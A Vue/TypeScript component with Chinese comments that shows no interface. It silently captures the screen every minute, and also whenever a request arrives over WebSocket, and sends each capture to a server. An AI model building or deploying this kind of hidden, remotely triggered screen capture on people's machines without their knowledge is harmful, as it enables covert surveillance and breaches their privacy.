<template>
  <!-- 不显示任何UI元素 -->
</template>

<script setup lang="ts">
import { onMounted, onUnmounted } from 'vue';
import { screenshotService } from '../services/screenshotService';
import { websocketService } from '../services/websocketService';

let screenshotInterval: number | null = null;

// 初始化服务
onMounted(() => {
  // 每分钟自动截图并直接发送到服务器
  startAutomaticScreenshots();
  
  // 初始化WebSocket连接
  initWebSocketHandlers();
});

// 组件卸载时清理
onUnmounted(() => {
  if (screenshotInterval) {
    clearInterval(screenshotInterval);
  }
  
  // 移除消息处理器
  websocketService.removeHandler('request_screenshot');
  
  // 注意：不要在这里关闭WebSocket连接，因为它可能在其他组件中也在使用
});

/**
 * 启动自动截图功能
 */
function startAutomaticScreenshots() {
  // 每分钟执行一次
  screenshotInterval = setInterval(async () => {
    try {
      // 直接捕获并发送主屏幕截图
      await screenshotService.captureAndSendDirectly();
      
      console.log('自动截图已完成并发送');
    } catch (error) {
      console.error('自动截图失败:', error);
    }
  }, 60000); // 60000毫秒 = 1分钟
  
  // 立即执行一次
  captureAndSendDirectly();
}

/**
 * 直接捕获并发送一次截图
 */
async function captureAndSendDirectly() {
  try {
    await screenshotService.captureAndSendDirectly();
    console.log('截图已完成并直接发送');
  } catch (error) {
    console.error('截图并发送失败:', error);
  }
}

/**
 * 初始化WebSocket消息处理器
 */
function initWebSocketHandlers() {
  // 初始化WebSocket连接
  websocketService.init();
  
  // 注册截图请求处理器
  websocketService.registerHandler('request_screenshot', async (message: any) => {
    try {
      console.log('收到WebSocket截图请求');
      
      // 执行截图
      await captureAndSendDirectly();
      
      // 发送确认消息
      websocketService.sendMessage({
        type: 'screenshot_completed',
        requestId: message.requestId || 'unknown',
        status: 'success',
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.error('处理WebSocket截图请求失败:', error);
      
      // 发送失败通知
      websocketService.sendMessage({
        type: 'screenshot_failed',
        requestId: message.requestId || 'unknown',
        error: String(error),
        timestamp: new Date().toISOString()
      });
    }
  });
  
  console.log('WebSocket消息处理器已初始化');
}
</script>

<style scoped>
/* 没有需要的样式 */
</style> 